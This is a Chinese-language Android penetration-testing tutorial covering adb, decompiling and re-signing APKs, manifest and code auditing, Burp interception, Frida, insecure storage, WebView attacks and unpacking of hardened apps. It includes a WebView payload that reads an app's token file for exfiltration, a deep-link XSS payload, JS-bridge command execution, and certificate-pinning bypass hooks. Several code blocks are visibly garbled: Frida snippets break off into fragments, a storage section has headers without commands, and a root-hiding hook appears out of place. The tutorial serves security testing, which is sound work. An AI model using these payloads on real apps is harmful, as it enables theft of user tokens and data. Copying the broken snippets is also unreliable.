Android 架構與安全模型

Android 安全模型建立在 Linux 核心之上，透過多層防禦機制保護用戶數據和系統資源。理解這些機制是進行移動安全測試的基礎。

Android 分層架構

Layer 5
應用層（Applications）
用戶安裝的 App（含系統 App），每個 App 在獨立沙盒中運行。測試的主要目標層級。
Layer 4
應用框架層（Application Framework）
ActivityManager、PackageManager、ContentResolver 等。四大組件（Activity/Service/BroadcastReceiver/ContentProvider）的管理核心，許多漏洞源於此層的錯誤使用。
Layer 3
Android Runtime / 原生庫
ART 虛擬機執行 .dex 字節碼；OpenSSL、SQLite、WebKit 等原生庫。第三方庫漏洞（如 CVE 的 OpenSSL 漏洞）在此層影響。
Layer 2
硬體抽象層（HAL）
攝像頭、藍牙、GPS 等硬體接口。固件漏洞和驅動漏洞在此層。
Layer 1
Linux 核心（Kernel）
基於 Linux 的系統核心，提供進程隔離（UID/GID 機制）、SELinux 強制訪問控制、Seccomp 系統調用過濾。

Android 核心安全機制

應用沙盒（App Sandbox）
每個 App 分配唯一 UID，進程相互隔離。App A 的文件對 App B 不可見（除非明確共享）。Root 後沙盒失效。
權限系統（Permissions）
訪問相機、位置、聯繫人等敏感資源需在 Manifest 聲明並由用戶授權（Android 6.0+ 運行時權限）。過度請求權限是安全問題。
SELinux
強制訪問控制（MAC），即使獲取 root 也受到 SELinux 策略限制。Permissive 模式下 SELinux 不阻止但記錄違規。
應用簽名（Code Signing）
所有 APK 必須使用開發者密鑰簽名。系統用簽名驗證 App 完整性，防止篡改後安裝。V1/V2/V3 簽名方案遞進增強。
KeyStore 系統
Android 提供的硬體安全存儲，用於保存加密密鑰和憑證。在 TEE（可信執行環境）中執行加密操作，密鑰無法被提取。
SafetyNet / Play Integrity
Google 的設備完整性認證 API，用於檢測 Root、解鎖 Bootloader、Hook 框架等。銀行/金融 App 廣泛使用，可被 Magisk 等工具繞過。
移動安全測試核心思路

Android 安全測試的本質是突破沙盒邊界和發現組件暴露。測試者需要以一個惡意 App 或中間人的視角思考：這個 App 是否把敏感數據寫到了外部存儲？有沒有暴露了可被其他 App 調用的組件？有沒有在通訊層進行充分加密驗證？

APK 結構解析與四大組件安全

APK（Android Package）本質上是一個 ZIP 壓縮包。理解其內部結構是靜態分析的起點。

APK 內部結構

文件/目錄內容安全關注點
AndroidManifest.xmlApp 配置：組件聲明、權限請求、最低 SDK 版本組件是否過度暴露、是否允許備份、debuggable 是否開啟
classes.dexDalvik 字節碼（Java/Kotlin 代碼編譯後的格式）反編譯後查找硬編碼密鑰、危險 API 調用
res/XML 佈局、字串資源、圖片等res/raw/ 中可能存放敏感配置文件
assets/原始資源文件（不編譯），App 可直接讀取可能包含配置文件、SQLite DB、加密密鑰
lib/原生庫（.so 文件），按 CPU 架構分目錄逆向 .so 可能找到硬編碼邏輯或隱藏 API Key
META-INF/簽名信息（MANIFEST.MF、CERT.RSA）重打包 APK 後簽名驗證失效，需重新簽名

四大組件與暴露風險

01
Activity — 用戶界面頁面。若設置 exported="true" 且無權限保護，任意 App 均可啟動。攻擊者可用 adb shell am start 直接跳轉到登入後的頁面，繞過認證。
02
Service — 後台服務。若暴露且無鑒權，外部 App 可與其交互。某些 Service 處理敏感操作（如支付），未授權調用可導致業務邏輯漏洞。
03
BroadcastReceiver — 廣播接收器。若設置 exported="true" 且無簽名權限保護，任意 App 可發送偽造廣播。曾有 App 的 SMS 接收器被惡意 App 劫持。
04
ContentProvider — 數據提供者。若 exported="true" 且 readPermission/writePermission 未設置，任意 App 可讀寫其管理的數據庫，導致數據洩露或注入攻擊（SQL Injection through ContentProvider）。

# ─── 安裝 Burp CA 憑證到模擬器系統信任存儲 ───
# 步驟1：從 Burp Suite 導出 DER 格式憑證

adb push 9a5ba575.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0
adb reboot

ADB 工具完整指南

ADB（Android Debug Bridge）是 Android 開發和安全測試最基礎的工具，幾乎所有動態分析操作都要用到它。

ADB — 完整命令速查
# ─── 設備連接與管理 ───
adb devices                        # 列出已連接設備
adb -s emulator-5554 shell         # 指定設備連接（多設備時）
adb connect 192.168.1.100:5555     # TCP 無線連接

# ─── 應用管理 ───
adb install app.apk                # 安裝 APK
adb install -r app.apk             # 覆蓋安裝（保留數據）
adb uninstall com.example.app      # 卸載（包名）
adb shell pm list packages         # 列出所有已安裝包名
adb shell pm list packages -3      # 只列出第三方 App
adb shell pm path com.example.app  # 查找 APK 路徑

# ─── 提取 APK（從設備導出 App 進行分析）───
adb shell pm path com.target.app
# 輸出：package:/data/app/com.target.app-xxx.apk
adb pull /data/app/com.target.app-xxx.apk ./target.apk

# ─── 文件傳輸 ───
adb push local_file.txt /sdcard/
adb pull /sdcard/remote_file.txt ./

# ─── 調試與日誌 ───
adb logcat                                   # 查看所有日誌
adb logcat -s "com.example.app"             # 過濾特定 App 日誌
adb logcat | grep -i "password\|token\|key" # 查找敏感信息洩露

# ─── Shell 操作 ───
adb shell                                    # 進入 Shell
adb shell id                                 # 查看當前用戶
adb shell dumpsys activity                  # 查看 Activity 堆疊
adb shell am start -n com.pkg/.MainActivity  # 啟動 Activity
adb shell am start -a android.intent.action.VIEW -d "app://target"  # 測試深度連結

# ─── 數據目錄訪問（需 root 或 run-as）───
adb shell run-as com.example.app ls /data/data/com.example.app/
adb shell su -c "ls /data/data/com.example.app/"
小測驗
在進行 Android 安全測試時，你想從已安裝在設備上的目標 App 提取 APK 文件進行分析。以下正確的操作順序是？
A直接使用 adb pull /data/app/com.target.app.apk
B先用 adb shell pm path com.target.app 獲取 APK 路徑，再用 adb pull 提取
C使用 adb install --extract 命令
D只能從 Google Play 下載，無法直接提取
正確！APK 的安裝路徑不是固定的，每個 App 的路徑都不同，格式通常是 /data/app/com.pkg-randomhash/base.apk。正確做法：先用 pm path 獲取確切路徑，再用 adb pull 提取到本機。另外也可以使用 apk-mitm、APKExtractor 等 App 在設備上直接導出。

APK 反編譯：jadx / apktool

靜態分析是在不運行 App 的情況下分析其代碼和資源。反編譯工具將 .dex 字節碼還原成可讀的 Java/Kotlin 代碼，是代碼審計的基礎。

jadx
將 .dex 直接反編譯為 Java 源碼，有 GUI 介面（jadx-gui），支持搜索、交叉引用、資源查看。是最常用的 Android 反編譯工具，推薦使用 GUI 版本進行代碼審計。
apktool
將 APK 反編譯為 Smali 組合語言（Android 的彙編語言）。主要用於修改 APK（如繞過 Root 檢測）後重新打包。jadx 的 Java 代碼更易讀，apktool 的 Smali 更適合精確修改。
dex2jar + jd-gui
舊式工具組合：dex2jar 將 .dex 轉換為 .jar，再用 jd-gui 查看 Java 代碼。已基本被 jadx 取代，但某些混淆場景下的反編譯效果有所不同。
Ghidra / IDA Pro
逆向工程框架，用於分析 APK 中的原生庫（.so 文件）。當敏感邏輯（如加密算法、Root 檢測）放在 C/C++ 原生代碼中時使用。
jadx / apktool — 基本使用
# ─── jadx 反編譯（推薦）───
# 安裝
wget https://github.com/skylot/jadx/releases/latest/download/jadx-1.5.0.zip
unzip jadx-1.5.0.zip -d jadx/

# 命令行反編譯到目錄
jadx/bin/jadx -d output_dir/ target.apk

# 啟動 GUI（推薦）
jadx/bin/jadx-gui target.apk

# ─── apktool 反編譯與重打包 ───
# 反編譯（得到 Smali 代碼 + 資源）
apktool d target.apk -o target_smali/

# 修改 Smali 代碼後重新打包
apktool b target_smali/ -o modified.apk

# 重新簽名（重打包後必須簽名才能安裝）
keytool -genkey -v -keystore test.keystore -alias test -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore test.keystore modified.apk test
# 或使用 apksigner（更現代）
apksigner sign --ks test.keystore --ks-key-alias test modified.apk

# ─── 在 jadx 中高效搜索敏感信息 ───
# jadx-gui 中使用 Ctrl+Shift+F 全局搜索：
# 搜索關鍵詞：password  secret  apikey  token  hardcode  encrypt  BASE64
# 搜索危險 API：Runtime.exec  loadUrl  setJavaScriptEnabled  openFileOutput

AndroidManifest.xml 安全審計

AndroidManifest.xml 是 Android App 的配置清單，包含組件聲明、權限請求等關鍵信息。靜態審計的第一步就是仔細分析 Manifest 文件。

AndroidManifest.xml — 安全問題速查
<!-- ─── 1. debuggable=true（高危！）─── -->
<!-- 生產版本絕對不能開啟，允許 adb 直接 debug App，繞過沙盒 -->
<application android:debuggable="true">  <!-- 危！-->

<!-- ─── 2. allowBackup=true（中危）─── -->
<!-- 允許 adb backup 提取 App 所有數據（包括 SharedPreferences、DB）-->
<application android:allowBackup="true">  <!-- 敏感 App 應設為 false -->

<!-- ─── 3. 組件過度暴露 ─── -->
<!-- Activity 暴露且無 permission 保護：任意 App 可啟動 -->
<activity android:name=".AdminActivity" android:exported="true">

<!-- ContentProvider 讀寫均未設權限 -->
<provider
    android:name=".UserProvider"
    android:exported="true"
    android:readPermission=""   <!-- 空字串 = 任意可讀！-->
    android:writePermission="">

<!-- ─── 4. 過度請求危險權限 ─── -->
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.RECORD_AUDIO"/>
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
<!-- 一個筆記 App 為何需要麥克風和精確位置？疑似間諜軟件 -->

<!-- ─── 5. 深度連結（Deep Link）配置 ─── -->
<intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <data android:scheme="myapp" android:host="callback"/>
</intent-filter>
<!-- 自定義 scheme 可被其他 App 偽造：myapp://callback?token=stolen -->

代碼審計：敏感信息與危險 API

Android 代碼審計 — 關鍵搜索目標
// ─── 1. 硬編碼敏感信息（常見！）───
// 在 jadx-gui 中搜索：
String apiKey = "sk-live-xxxxxxxxxxxxxxxx";      // API Key
String dbPass = "admin123";                      // 資料庫密碼
String aesKey = "MySecretKey123456";              // 加密密鑰
String url    = "http://192.168.1.100:8080/api";  // 內網地址洩露

// ─── 2. 不安全的日誌輸出 ───
Log.d("Auth", "Token: " + authToken);      // adb logcat 可見
Log.e("DB", "Error: " + query + password); // 密碼出現在日誌中

// ─── 3. 不安全的 WebView 配置 ───
webView.getSettings().setJavaScriptEnabled(true);
webView.getSettings().setAllowFileAccess(true);        // 允許讀取本地文件
webView.getSettings().setAllowFileAccessFromFileURLs(true); // 危！
webView.addJavascriptInterface(new JsInterface(), "android"); // JS 橋接

// ─── 4. 明文 HTTP 通訊 ───
URL url = new URL("http://api.target.com/login"); // 無加密傳輸

// ─── 5. 不安全的隨機數（密碼學相關）───
Random r = new Random();   // 應使用 SecureRandom
r.nextInt(1000000);         // 可預測的 OTP！

// ─── 6. 命令執行（少見但高危）───
Runtime.getRuntime().exec(cmd);  // 如果 cmd 包含用戶輸入 → 命令注入

// ─── 7. 弱加密 ───
Cipher.getInstance("DES");          // DES 已不安全，應用 AES-256
Cipher.getInstance("AES/ECB/...");  // ECB 模式不安全（相同明文→相同密文）
MessageDigest.getInstance("MD5");    // 不應用於密碼 Hash，應用 bcrypt/scrypt

代碼混淆（Obfuscation）

大多數商業 App 會使用 ProGuard 或 R8 進行代碼混淆，將類名/方法名替換為 a.b.c() 等無意義名稱，增加逆向難度。應對策略：尋找關鍵字串（如 "password"）作為線索，使用 jadx 的交叉引用功能追蹤調用鏈，不需要看懂所有代碼，只需找到感興趣的功能點。

HTTP(S) 流量抓包：Burp + 憑證繞過

抓取 App 的 HTTP(S) 流量是動態分析的核心，能直接看到 App 與服務器之間的通訊，發現未加密的敏感數據、不安全的 API 設計等問題。

Android HTTPS 抓包配置
# ─── 方法1：設置 WiFi 代理（基本方法）───
# 設備 → WiFi → 長按當前網路 → 修改 → 進階 → 代理 → 手動
# 主機名：攻擊機 IP（如 192.168.1.50）
# 端口：8080（Burp 默認監聽端口）

# ─── Android 7.0+ 的 TrustManager 問題 ───
# Android 7.0 起，App 默認不信任用戶安裝的 CA（只信任系統 CA）
# 解決方案1（最簡單）：將 Burp CA 推送到系統信任存儲（需 Root）
# 見 L1-3 中的步驟

# 解決方案2：修改 APK 的 network_security_config
# 在 res/xml/network_security_config.xml 中添加用戶憑證信任：
# <network-security-config>
#   <debug-overrides>
#     <trust-anchors>
#       <certificates src="user"/>  <!-- 信任用戶安裝的 CA -->
#     </trust-anchors>
#   </debug-overrides>
# </network-security-config>
# 然後用 apktool 重打包並安裝

# 解決方案3：使用 apk-mitm 工具自動完成上述修改
npm install -g apk-mitm
apk-mitm target.apk      # 自動修改並重打包

# ─── 憑證固定（Certificate Pinning）繞過 ───
# 部分 App 內建了服務器的憑證 Hash（Pin），即使安裝了 Burp CA 也無法抓包
# 繞過方法：使用 Frida Hook 掛起 SSL 驗證（見 L3-2）
# 工具：objection --  android sslpinning disable
#        Frida SSL unpinning 通用腳本

Frida 動態插樁入門

Frida 是業界最強大的動態插樁框架，允許在 App 運行時注入 JavaScript 代碼，Hook 任意 Java 方法，修改參數和返回值，繞過各種安全機制。

Frida 架構

Frida 由兩部分組成：在電腦端運行的 frida-tools（Python 工具集），和在 Android 設備上運行的 frida-server（守護進程）。電腦端通過 ADB 與設備端通訊，注入 JavaScript 代碼到目標 App 進程。

Frida — 安裝與基本使用
# ─── 安裝 frida-tools（電腦端）───
pip3 install frida-tools

# ─── 在 Android 設備上部署 frida-server ───
# 步驟1：確認設備架構
adb shell getprop ro.product.cpu.abi    # 輸出：arm64-v8a

# 步驟2：下載對應版本的 frida-server
# https://github.com/frida/frida/releases
# 下載 frida-server-16.x.x-android-arm64.xz
xz -d frida-server-16.x.x-android-arm64.xz

# 步驟3：推送並啟動
adb push frida-server-16.x.x-android-arm64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server
adb shell su -c "/data/local/tmp/frida-server &"   # 後台啟動

# ─── 基本操作 ───

Java.perform(function() {

        name: 'com.bypass.TrustAllCerts',

            checkServerTrusted: function() {},

    sslContext.init(null, [TrustAllCerts.$new()], null);

        return sslContext;
    };

小測驗
在測試一個銀行 App 時，你配置了 Burp Suite 代理，但 HTTPS 流量無法被攔截，顯示 SSL 握手失敗。排除了 Burp CA 未安裝的可能後，最可能的原因是什麼？
ABurp Suite 不支持攔截 Android App 的流量
BApp 使用的是 HTTP/3（QUIC），不走 TCP 代理
CApp 實施了憑證固定（Certificate Pinning），內建了服務器憑證 Hash，拒絕信任 Burp CA
D設備 WiFi 代理設置錯誤
正確！憑證固定（Certificate Pinning）是銀行、金融類 App 的標配安全措施。App 在代碼中預先存儲了目標服務器的憑證 Hash 或公鑰，在建立 TLS 連接時不僅驗證憑證是否合法，還驗證是否與預存的 Hash 匹配。即使安裝了 Burp CA，由於 Hash 不匹配，SSL 握手仍然失敗。解決方案：使用 Frida Hook 或 Objection 的 android sslpinning disable 繞過。

不安全的數據存儲

Android App 有多種數據存儲方式，每種方式的安全性不同。許多 App 將敏感數據（Session Token、密碼、個人信息）存儲在不安全的位置，是 OWASP Mobile Top 10 的第一位。

存儲方式位置默認安全性常見問題
SharedPreferences/data/data/pkg/shared_prefs/*.xml沙盒保護（Root 後可讀）明文存儲 Token/密碼；MODE_WORLD_READABLE 允許任意 App 讀取
SQLite 資料庫/data/data/pkg/databases/*.db沙盒保護（Root 後可讀）未加密存儲敏感數據；SQL 注入（通過 ContentProvider）
外部存儲（SD 卡）/sdcard/Android/data/pkg/無保護，任意 App 可讀將敏感文件（備份、日誌）寫入外部存儲
緩存文件/data/data/pkg/cache/沙盒保護HTTP 響應緩存包含敏感 API 數據
KeyStore硬體安全存儲最安全很少出現問題；正確做法是用 KeyStore 存儲密鑰
不安全數據存儲 — 測試與發現
# ─── 使用 adb 提取和分析數據（需 Root 或 debuggable App）───

# ─── 使用 adb backup（不需要 Root）───

WebView 漏洞：XSS 與 UXSS

WebView 是 Android App 內嵌的 Web 瀏覽器組件，允許 App 顯示 Web 內容。不安全的 WebView 配置可能讓 Web 漏洞影響整個 App，甚至讀取本地文件。

WebView 漏洞利用
// ─── 危險配置（代碼中）───
WebSettings settings = webView.getSettings();
settings.setJavaScriptEnabled(true);
settings.setAllowFileAccess(true);                  // 允許 file:// URI
settings.setAllowFileAccessFromFileURLs(true);       // 允許跨 file:// 訪問
settings.setAllowUniversalAccessFromFileURLs(true); // 危！file:// 可跨域請求

// ─── 攻擊1：讀取本地文件（AllowUniversalAccess）───
// 攻擊者誘使目標 App 的 WebView 載入惡意頁面：
// 惡意頁面 JS：
var xhr = new XMLHttpRequest();
xhr.open("GET", "file:///data/data/com.target.app/shared_prefs/tokens.xml", false);
xhr.send(null);
// 然後把 xhr.responseText 發送到攻擊者服務器

// ─── 攻擊2：JavaScript Bridge 注入（addJavascriptInterface）───
// 如果 App 設置了 JS Bridge：
webView.addJavascriptInterface(new AppBridge(), "Android");

// 惡意頁面可調用 Android 原生方法：
Android.readFile("/etc/hosts");           // 如果 Bridge 暴露了文件操作
Android.executeCommand("id");            // 如果 Bridge 暴露了命令執行
// Android 4.2 以前：Bridge 暴露所有 public 方法（含 getClass()），可 RCE

// ─── 攻擊3：深度連結觸發 WebView XSS ───
// 發現 App 有深度連結處理 URL 的 Activity
// 構造惡意連結：
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://webview?url=javascript:alert(document.cookie)"

            console.log('[*] Hiding: ' + path);
            return false;
        }
        return this.exists();
    };
});

Android 加固與反加固技術

應用加固是保護 APK 免被逆向分析的技術，常見於金融、遊戲類 App。安全測試人員需要能夠識別加固方案並進行脫殼分析。

加固方案廠商識別特徵脫殼方法
娜迦（Nagapt）/ 梆梆安全國內廠商APK 包含 libDexProtect.so 或 libsecexe.soFrida + FART 主動調用脫殼
騰訊樂固騰訊assets/ 中有 .jar 文件，包名中有 leguFrida DexDump 內存 dump
阿里聚安全阿里libmobisec.so 或 com.alibaba.utilFrida 內存搜索 + dump
VMP 保護各廠代碼被替換為自定義虛擬機指令最難，需分析自定義 VM，或直接 Hook 行為
常用脫殼工具與方法
# ─── FRIDA-DEXDump（最常用）───

# 在 App 運行時從記憶體中 dump 所有載入的 .dex 文件
# 輸出到當前目錄，可直接用 jadx 分析

# ─── FART（主動調用脫殼）───
# 需要刷入修改版 ROM（集成 FART 的 Android），強制執行所有方法
# 適合代碼抽取型加固（方法體在調用時才解密）

# ─── 使用 Frida 搜索記憶體中的 .dex 文件頭 ───
# .dex 文件頭魔數：64 65 78 0A（"dex\n"）
# Frida 腳本搜索所有符合的內存區域並 dump

# ─── 識別加固（jadx 分析時無法看到代碼）───
# 症狀：jadx 反編譯後只看到 Application.onCreate() 和一個空殼
# 主要的類都在加密的 .so 或 assets 中，需要脫殼才能分析
